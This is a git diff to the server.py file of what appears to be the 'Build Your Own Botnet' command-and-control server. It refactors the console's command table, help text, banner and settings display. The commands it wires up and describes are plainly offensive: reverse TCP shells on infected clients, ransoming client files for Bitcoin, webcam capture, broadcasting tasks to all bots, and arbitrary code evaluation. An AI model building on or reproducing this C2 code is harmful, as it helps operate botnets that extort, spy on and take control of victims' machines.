@@ -1,6 +1,7 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-"""Command & Control (Build Your Own Botnet)
+'Command & Control (Build Your Own Botnet)'
+__banner__ = """
 
 88                                  88
 88                                  88
@@ -48,11 +49,23 @@ util.imports(packages, __builtins__)
 __threads = {}
 __abort = False
 __debug = bool('--debug' in sys.argv)
+__banner__ = """ 
+
+88                                  88
+88                                  88
+88                                  88
+88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
+88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
+88       d8  `8b   d8'  8b       d8 88       d8
+88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
+8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
+                d8'
+               d8'
+
+"""
 try:
     import colorama
     colorama.init(autoreset=True)
-#    print(random.choice(filter(str.isupper, dir(colorama.Fore))) + __doc__)
-    print(colorama.Fore.RED + colorama.Style.NORMAL + __doc__)
 except ImportError:
    util.__logger__.debug("installing required Python package 'colorama'...")
    execfile('setup.py')
@@ -61,6 +74,7 @@ except ImportError:
 
 # main
 def main():
+    print(colorama.Fore.RED + colorama.Style.NORMAL + __banner__)
     parser = argparse.ArgumentParser(
         prog='server.py',
         version='0.1.4',
@@ -131,32 +145,70 @@ class C2():
         self.socket = self._socket()
         self.banner = self._banner()
         self.commands = {
-            'set' : self.set,
-            'help' : self.help,
-            'exit' : self.quit,
-            'quit' : self.quit,
-            '$' : self.eval,
-            'eval' : self.eval,
-            'debug' : self.eval,
-            'db' : self.query,
-            'query' : self.query,
-            'database' : self.query,
-            'options' : self.settings,
-            'settings' : self.settings,
-            'sessions' : self.session_list,
-            'clients' : self.session_list,
-            'shell' : self.session_shell,
-            'ransom' : self.session_ransom,
-            'webcam' : self.session_webcam,
-            'kill' : self.session_remove,
-            'drop' : self.session_remove,
-            'back' : self.session_background,
-            'bg' : self.session_background,
-            'background' : self.session_background,
-            'sendall' : self.task_broadcast,
-            'broadcast' : self.task_broadcast,
-            'results' : self.task_list,
-            'tasks' : self.task_list}
+            'set' : {
+                'method': self.set,
+                'usage': 'set <setting> [option=value]',
+                'description': 'change the value of a setting'},
+            'help' : {
+                'method': self.help,
+                'usage': 'help',
+                'description': 'show usage help for server commands'},
+            'exit' : {
+                'method': self.quit,
+                'usage': 'exit',
+                'description': 'quit the server'},
+            'eval' : {
+                'method': self.eval,
+                'usage': 'eval <code>',
+                'description': 'execute python code directly on server (debugging MUST be enabled)'},
+            'query' : {
+                'method': self.query,
+                'usage': 'query <statement>',
+                'description': 'query the SQLite database'},
+            'options' : {
+                'method': self.settings,
+                'usage': 'options',
+                'description': 'show currently configured settings'},
+            'sessions' : {
+                'method': self.session_list,
+                'usage': 'sessions',
+                'description': 'show active client sessions'},
+            'clients' : {
+                'method': self.session_list,
+                'usage': 'clients',
+                'description': 'show all clients that have joined the server'},
+            'shell' : {
+                'method': self.session_shell,
+                'usage': 'shell <id>',
+                'description': 'interact with a client with a reverse TCP shell through an active session'},
+            'ransom' : {
+                'method': self.session_ransom,
+                'usage': 'ransom [id]',
+                'description': 'encrypt client files & ransom encryption key for a Bitcoin payment'},
+            'webcam' : {
+                'method': self.session_webcam,
+                'usage': 'webcam <mode>',
+                'description': 'capture image/video from the webcam of a client device'},
+            'kill' : {
+                'method': self.session_remove,
+                'usage': 'kill <id>',
+                'description': 'end a session'},
+            'bg' : {
+                'method': self.session_background,
+                'usage': 'bg [id]',
+                'description': 'background a session (default: the current session)'},
+            'broadcast' : {
+                'method': self.task_broadcast,
+                'usage': 'broadcast <command>',
+                'description': 'broadcast a task to all active sessions'},
+            'results': {
+                'method': self.task_list,
+                'usage': 'results [id]',
+                'description': 'display all completed task results for a client (default: all clients)'},
+            'tasks' : {
+                'method': self.task_list,
+                'usage': 'tasks [id]',
+                'description': 'display all incomplete tasks for a client (default: all clients)'}}
 
     def _error(self, data):
         lock = self.current_session._lock if self.current_session else self._lock
@@ -291,7 +343,7 @@ class C2():
         """
         column1 = 'command <arg>'
         column2 = 'description'
-        info = info if info else {"back": "background the current session", "shell <id>": "interact with client via reverse shell", "sessions": "list all sessions", "exit": "exit the program but keep sessions alive", "sendall <command>": "send a command to all active sessions", "settings <value> [options]": "show current settings", "set <option>=[value]": "change settings/options"}
+        info = info if info else {command['usage']: command['description'] for command in self.commands.values()}
         max_key = max(map(len, info.keys() + [column1])) + 2
         max_val = max(map(len, info.values() + [column2])) + 2
         util.display('\n', end=',')
@@ -345,10 +397,13 @@ class C2():
         text_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._text_style][0]
         prompt_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._prompt_color][0]
         prompt_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._prompt_style][0]
-        util.display('\n\t    SETTINGS', color='white', style='bright')
-        util.display('\ttext color/style', color=self._text_color, style=self._text_style)
-        util.display('\tprompt color/style', color=self._prompt_color, style=self._prompt_style)
-        util.display('\tdebug: {}\n'.format('true' if globals()['__debug'] else 'false'), color='white', style='normal')
+        util.display('\n\t    OPTIONS', color='white', style='bright')
+        util.display('text color/style: ', color='white', style='normal', end=',')
+        util.display('/'.join((self._text_color.title(), self._text_style.title())), color=self._text_color, style=self._text_style)
+        util.display('prompt color/style: ', color='white', style='normal', end=',')
+        util.display('/'.join((self._prompt_color.title(), self._prompt_style.title())), color=self._prompt_color, style=self._prompt_style)
+        util.display('debug: ', color='white', style='normal', end=',')
+        util.display('True\n' if globals()['__debug'] else 'False\n', color='green' if globals()['__debug'] else 'red', style='normal')
 
     def set(self, args=None):
         """ 
@@ -547,9 +602,7 @@ class C2():
         lock = self.current_session._lock if self.current_session else self._lock
         with lock:
             sessions = self.database.get_sessions(verbose=verbose)
-            for session_id, session in enumerate(sessions):
-                util.display(str(session_id + 1), color=self._text_color, style=self._text_style)
-                self.database._display(session)
+            self.database._display(sessions)
 
     def session_ransom(self, args=None):
         """ 
@@ -646,7 +699,7 @@ class C2():
                     cmd, _, action = cmd_buffer.partition(' ')
                     if cmd in self.commands:
                         try:
-                            output = self.commands[cmd](action) if len(action) else self.commands[cmd]()
+                            output = self.commands[cmd]['method'](action) if len(action) else self.commands[cmd]['method']()
                         except Exception as e1:
                             output = str(e1)
                     elif cmd == 'cd':
@@ -798,7 +851,7 @@ class Session(threading.Thread):
                         if cmd in ('\n', ' ', ''):
                             continue
                         elif cmd in globals()['c2'].commands and cmd != 'help':
-                            result = globals()['c2'].commands[cmd](action) if len(action) else globals()['c2'].commands[cmd]()
+                            result = globals()['c2'].commands[cmd]['method'](action) if len(action) else globals()['c2'].commands[cmd]['method']()
                             if result:
                                 task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
                                 globals()['c2'].display(result)
